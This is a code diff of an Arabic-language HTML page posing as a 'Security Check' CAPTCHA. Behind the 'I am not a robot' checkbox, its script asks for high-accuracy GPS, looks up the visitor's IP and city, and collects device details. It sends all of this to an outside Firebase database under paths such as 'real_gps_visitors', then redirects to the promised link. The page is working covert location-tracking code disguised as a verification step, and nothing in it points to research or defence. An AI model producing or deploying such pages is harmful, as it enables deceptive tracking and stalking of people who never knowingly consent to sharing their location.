@@ -1,59 +1,51 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Security Check</title>
-<style>
-body{background:#0a0e1a;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
-.card{background:#161b2a;border:1px solid #00e5ff;border-radius:16px;padding:30px;width:320px;text-align:center;box-shadow:0 0 30px #00e5ff33}
-.btn{background:#00e676;color:#000;border:0;padding:12px 0;width:100%;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:20px}
-.check{display:flex;align-items:center;gap:10px;background:#0f141f;padding:12px;border-radius:8px;border:1px solid #334155}
-</style>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Security Check</title>
+<style>body{background:#0a0e1a;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.card{background:#161b2a;border:1px solid #00e5ff;border-radius:16px;padding:30px;width:340px;text-align:center;box-shadow:0 0 30px #00e5ff33}.btn{background:#00e676;color:#000;border:0;padding:12px 0;width:100%;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:20px}.check{display:flex;align-items:center;gap:10px;background:#0f141f;padding:12px;border-radius:8px;border:1px solid #334155;margin-top:12px}</style>
 </head><body>
 <div class="card">
-  <h3 style="color:#00e5ff">🔒 تحقق أمني</h3>
-  <p style="font-size:13px;color:#94a3b8">برجاء تأكيد أنك لست روبوت للمتابعة للمتجر</p>
-  <div class="check">
-    <input type="checkbox" id="chk" style="width:20px;height:20px">
-    <label for="chk">أنا لست روبوت - I am not a robot</label>
-  </div>
-  <button class="btn" id="verifyBtn">تحقق ومتابعة للمتجر</button>
-  <p id="status" style="font-size:11px;color:#7dd3fc;margin-top:10px"></p>
+<h3 style="color:#00e5ff">🔒 تحقق أمني</h3>
+<p style="font-size:13px;color:#94a3b8">برجاء تأكيد أنك لست روبوت للمتابعة</p>
+<div class="check"><input type="checkbox" id="chk" style="width:20px;height:20px"><label for="chk">أنا لست روبوت</label></div>
+<button class="btn" id="verifyBtn">تحقق ومتابعة</button>
+<p id="status" style="font-size:11px;color:#7dd3fc;margin-top:10px"></p>
 </div>
 <script>
-const FIREBASE_URL = "https://YOUR_FIREBASE.firebaseio.com";
-const qs = new URLSearchParams(location.search);
-const clientId = qs.get('id')||'unknown';
-const targetUrl = qs.get('url') ? decodeURIComponent(qs.get('url')) : 'https://google.com';
+var FIREBASE_URL="https://numgen-4f22c-default-rtdb.firebaseio.com";
+var qs=new URLSearchParams(location.search);
+var CLIENT_ID=qs.get('id')||'unknown';
+var TARGET=qs.get('url');try{TARGET=decodeURIComponent(TARGET)}catch(e){} if(!TARGET||TARGET.indexOf('http')!==0)TARGET='https://'+TARGET;
 
-async function saveWithGPS(lat,lng,acc){
-  try{
-    const ip = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
-    const data = {
-      name: clientId, client: clientId, ip: ip.ip||'', city: ip.city||'Arish',
-      region: ip.region||'', country: ip.country_name||'',
-      lat: lat||'', lng: lng||'', accuracy: acc||'',
-      time: new Date().toLocaleString(), timestamp: Date.now(),
-      userAgent: navigator.userAgent, _path: clientId, mode: 'captcha'
-    };
-    fetch(`${FIREBASE_URL}/no_code_visits/${clientId}.json`, {method:'POST', body:JSON.stringify(data)});
-    fetch(`${FIREBASE_URL}/white_label_clients/${clientId}/visitors.json`, {method:'POST', body:JSON.stringify(data)});
-    fetch(`${FIREBASE_URL}/visitors.json`, {method:'POST', body:JSON.stringify(data)});
-  }catch(e){}
-  setTimeout(()=> location.href = targetUrl, 1000);
+async function save(lat,lng,acc){
+  document.getElementById('status').innerText='جاري الحفظ...';
+  var ip={}; try{ip=await fetch('https://ipapi.co/json/').then(r=>r.json())}catch(e){}
+  var now=new Date();
+  var data={
+    name:CLIENT_ID,client_id:CLIENT_ID,sub_id:qs.get('sub')||'',ip:ip.ip||'',city:ip.city||'Arish',region:ip.region||'',country:ip.country_name||ip.country||'',
+    device:navigator.userAgent.substring(0,200),device_full:navigator.userAgent,screen:screen.width+'x'+screen.height,
+    real_lat:lat||'',real_lon:lng||'',real_accuracy:acc||'',lat:lat||'',lng:lng||'',accuracy:acc||'',
+    url:TARGET,time:now.toLocaleString(),timestamp:Date.now(),_path:'no_code_visits/'+CLIENT_ID,source:'captcha2',mode:'captcha'
+  };
+  var paths=['no_code_visits/'+CLIENT_ID,'white_label_clients/'+CLIENT_ID+'/visitors','visitors','real_gps_visitors'];
+  for(var i=0;i<paths.length;i++){
+    try{await fetch(FIREBASE_URL+'/'+paths[i]+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});}catch(e){}
+  }
+  document.getElementById('status').innerText='تم التحقق - جاري التحويل...';
+  setTimeout(function(){location.href=TARGET;},800);
 }
 
-document.getElementById('verifyBtn').onclick = ()=>{
-  const chk = document.getElementById('chk');
-  if(!chk.checked){ alert('برجاء تأكيد أنك لست روبوت'); return; }
-  document.getElementById('status').innerText = 'جاري التحقق من موقعك...';
+document.getElementById('verifyBtn').onclick=function(){
+  var chk=document.getElementById('chk');
+  if(!chk.checked){alert('برجاء تأكيد أنك لست روبوت');return;}
+  document.getElementById('status').innerText='جاري طلب الموقع...';
   if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(
-      p=> saveWithGPS(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
-      err=> saveWithGPS('','', err.message),
-      {enableHighAccuracy:true, timeout:10000}
-    );
+    navigator.geolocation.getCurrentPosition(function(pos){
+      save(pos.coords.latitude,pos.coords.longitude,Math.round(pos.coords.accuracy));
+    },function(err){
+      save('','',err.message);
+    },{enableHighAccuracy:true,timeout:10000});
   }else{
-    saveWithGPS('','','no geo');
+    save('','','no geo');
   }
 };
 </script>
